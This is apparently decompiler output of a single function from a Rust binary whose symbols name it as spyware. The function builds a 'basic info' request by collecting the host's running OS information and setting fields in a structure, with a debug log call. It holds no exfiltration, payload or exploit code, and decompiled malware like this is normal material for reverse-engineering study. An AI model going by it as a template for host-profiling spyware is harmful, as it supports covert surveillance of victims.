
  fn spyware::actions::basic_info::get_basic_info_request::h37840dd4820167af(arg1: *mut i64) -> *mut i64

{
    if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4
    {
        let mut var_38: *mut *mut c_void = &data_4b97e8;
        let var_30_1: i64 = 1;
        let var_28_1: i64 = 8;
        let var_20_1: i128 = {0};
        let rax_1: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b97f8);
        let mut var_60: *const i8 = "spyware::actions::basic_infoHand…";
        let var_58_1: i64 = 0x1c;
        let var_50_1: *const i8 = "spyware::actions::basic_infoHand…";
        let var_48_1: i64 = 0x1c;
        let var_40_1: i64 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_38, 4, &var_60);
    }
    
    spyware::actions::basic_info::get_running_os_info::h2ac1d86b9171dd43(arg1);
    arg1[7] = 1;
    *arg1.byte_offset(0x3e) = 1;
    *arg1.byte_offset(0x3c) = 0x101;
    arg1[3] = -0x8000000000000000;
    arg1
}
